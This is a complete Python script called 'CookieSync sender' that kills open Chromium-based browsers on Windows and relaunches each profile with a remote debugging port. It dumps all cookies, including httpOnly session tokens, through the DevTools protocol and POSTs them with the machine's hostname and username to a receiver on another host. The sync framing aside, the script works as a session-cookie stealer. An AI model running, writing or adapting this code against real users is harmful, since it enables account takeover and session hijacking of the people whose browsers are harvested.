#!/usr/bin/env python3
"""
CookieSync sender. Runs on the source machine. Harvests cookies and POSTs them.

    python sender.py --host 192.168.1.50
    python sender.py --out cookies.json
"""
import argparse
import datetime
import json
import os
import pathlib
import socket
import subprocess
import sys
import time

try:
    import requests
    import websocket
except ImportError as exc:
    sys.exit(f"missing dependency ({exc}). Run: pip install -r requirements.txt")

REPO = pathlib.Path(__file__).resolve().parent.parent
CONF = REPO / "config.json"

DEFAULTS = {
    "host": "", "port": 8000, "token": "", "discovery": True,
    "discovery_port": 50505, "close_browsers": True, "debug_port": 9222,
}

CHROMIUM = [
    ("chrome",  r"%LOCALAPPDATA%\Google\Chrome\User Data",
                r"%PROGRAMFILES%\Google\Chrome\Application\chrome.exe", "chrome.exe"),
    ("edge",    r"%LOCALAPPDATA%\Microsoft\Edge\User Data",
                r"%PROGRAMFILES(X86)%\Microsoft\Edge\Application\msedge.exe", "msedge.exe"),
    ("brave",   r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data",
                r"%PROGRAMFILES%\BraveSoftware\Brave-Browser\Application\brave.exe", "brave.exe"),
    ("vivaldi", r"%LOCALAPPDATA%\Vivaldi\User Data",
                r"%LOCALAPPDATA%\Vivaldi\Application\vivaldi.exe", "vivaldi.exe"),
    ("opera",   r"%APPDATA%\Opera Software\Opera Stable",
                r"%LOCALAPPDATA%\Programs\Opera\opera.exe", "opera.exe"),
]

CFG = dict(DEFAULTS)


def log(m, quiet=False):
    if not quiet:
        print(m, flush=True)


def load_conf():
    if CONF.exists():
        try:
            CFG.update(json.loads(CONF.read_text("utf-8")))
        except Exception as exc:
            print(f"[!] config unreadable: {exc}")


def expand(p):
    return os.path.expandvars(p)


def discover(timeout=3.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.settimeout(0.4)
    for target in (("255.255.255.255", CFG["discovery_port"]), ("127.0.0.1", CFG["discovery_port"])):
        try:
            s.sendto(b"COOKIESYNC_DISCOVER", target)
        except OSError:
            pass

    found, seen, end = [], set(), time.time() + timeout
    while time.time() < end:
        try:
            data, addr = s.recvfrom(1024)
        except socket.timeout:
            continue
        if not data.startswith(b"COOKIESYNC_HERE "):
            continue
        try:
            info = json.loads(data.split(b" ", 1)[1])
        except Exception:
            continue
        key = (info.get("ip"), info.get("port"))
        if key in seen:
            continue
        seen.add(key)
        found.append(info)
    s.close()
    return found


def running():
    try:
        out = subprocess.run(["tasklist", "/fo", "csv", "/nh"], capture_output=True,
                             text=True, timeout=20).stdout.lower()
    except Exception:
        return set()
    names = {n for _, _, _, n in CHROMIUM}
    return {n for n in names if n in out}


def profiles(udd):
    root = pathlib.Path(expand(udd))
    if not root.is_dir():
        return [""]
    found = [p.name for p in root.iterdir()
             if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile "))]
    return found or [""]


def cdp_dump(exe, udd, profile, errors, quiet):
    exe, udd = expand(exe), expand(udd)
    if not os.path.isfile(exe) or not os.path.isdir(udd):
        return []

    port = int(CFG["debug_port"])
    args = [exe, f"--remote-debugging-port={port}", f"--user-data-dir={udd}",
            "--remote-allow-origins=*", "--no-first-run", "--no-default-browser-check"]
    if profile:
        args.append(f"--profile-directory={profile}")

    ws = None
    proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        ver = None
        for _ in range(40):
            try:
                ver = requests.get(f"http://127.0.0.1:{port}/json/version", timeout=1).json()
                if ver.get("webSocketDebuggerUrl"):
                    break
            except Exception:
                pass
            time.sleep(0.4)
        if not ver or not ver.get("webSocketDebuggerUrl"):
            errors.append(f"{os.path.basename(exe)}/{profile}: debug port never opened")
            return []

        ws = websocket.create_connection(ver["webSocketDebuggerUrl"], timeout=25)
        ws.send(json.dumps({"id": 1, "method": "Network.enable"}))
        ws.recv()
        ws.send(json.dumps({"id": 2, "method": "Storage.getCookies"}))
        raw = None
        deadline = time.time() + 25
        while time.time() < deadline:
            msg = json.loads(ws.recv())
            if msg.get("id") != 2:
                continue
            if msg.get("error"):
                ws.send(json.dumps({"id": 3, "method": "Network.getAllCookies"}))
                continue
            raw = msg.get("result", {}).get("cookies", [])
            break
        if raw is None:
            errors.append(f"{os.path.basename(exe)}/{profile}: cookie call failed")
            return []

        return [{"domain": c.get("domain"), "name": c["name"], "value": c["value"],
                 "path": c.get("path"), "secure": c.get("secure"),
                 "httpOnly": c.get("httpOnly"), "expires": c.get("expires")} for c in raw]
    except Exception as exc:
        errors.append(f"{os.path.basename(exe)}/{profile}: {exc}")
        return []
    finally:
        if ws is not None:
            try:
                ws.close()
            except Exception:
                pass
        subprocess.run(["taskkill", "/f", "/t", "/pid", str(proc.pid)], capture_output=True)


def collect(quiet=False):
    result, errors = {}, []

    if CFG["close_browsers"]:
        live = running()
        if live:
            log(f"[*] closing: {', '.join(sorted(live))}", quiet)
            for n in live:
                subprocess.run(["taskkill", "/f", "/im", n], capture_output=True)
            time.sleep(2)

    for name, udd, exe, _ in CHROMIUM:
        total = []
        for prof in profiles(udd):
            rows = cdp_dump(exe, udd, prof, errors, quiet)
            if not rows and prof:
                rows = cdp_dump(exe, udd, prof, errors, quiet)
            total.extend(rows)
        if total:
            result[name] = total
            log(f"[*] {name}: {len(total)}", quiet)

    if errors:
        result["_errors"] = errors
    result["_meta"] = {"host": socket.gethostname(), "user": os.environ.get("USERNAME"),
                       "time": datetime.datetime.now().isoformat()}
    return result


def main():
    ap = argparse.ArgumentParser(description="CookieSync sender")
    ap.add_argument("--host")
    ap.add_argument("--port", type=int)
    ap.add_argument("--token")
    ap.add_argument("--out")
    ap.add_argument("--discovery-port", type=int)
    ap.add_argument("--no-close-browsers", action="store_true")
    ap.add_argument("--list-hosts", action="store_true")
    ap.add_argument("--quiet", action="store_true")
    a = ap.parse_args()

    load_conf()
    if a.host:               CFG["host"] = a.host
    if a.port:               CFG["port"] = a.port
    if a.token is not None:  CFG["token"] = a.token
    if a.discovery_port:     CFG["discovery_port"] = a.discovery_port
    if a.no_close_browsers:  CFG["close_browsers"] = False

    if a.list_hosts:
        hosts = discover()
        if not hosts:
            print("no receivers found")
        for h in hosts:
            print(f"{h.get('ip')}:{h.get('port')}  {h.get('name')}")
        return 0

    if not CFG["host"]:
        log("[*] discovering...", a.quiet)
        hosts = discover()
        if not hosts:
            print("[!] no receiver found. Start it on the other PC or pass --host.")
            return 1
        CFG["host"], CFG["port"] = hosts[0]["ip"], hosts[0]["port"]

    data = collect(a.quiet)
    total = sum(len(v) for k, v in data.items() if not k.startswith("_"))
    payload = json.dumps(data, indent=1).encode()

    if a.out:
        pathlib.Path(a.out).write_bytes(payload)
        log(f"[+] wrote {total} to {a.out}", a.quiet)
        return 0

    url = f"http://{CFG['host']}:{CFG['port']}/cookies"
    headers = {"X-Token": CFG["token"]} if CFG["token"] else {}
    log(f"[*] posting {total} to {url}", a.quiet)
    for attempt in range(3):
        try:
            resp = requests.post(url, data=payload, headers=headers, timeout=120)
            if resp.status_code == 200:
                log(f"[+] delivered {total}", a.quiet)
                return 0
            print(f"[!] receiver {resp.status_code}: {resp.text.strip()}")
        except Exception as exc:
            print(f"[!] send failed: {exc}")
        time.sleep(3 * (attempt + 1))
    return 1


if __name__ == "__main__":
    sys.exit(main())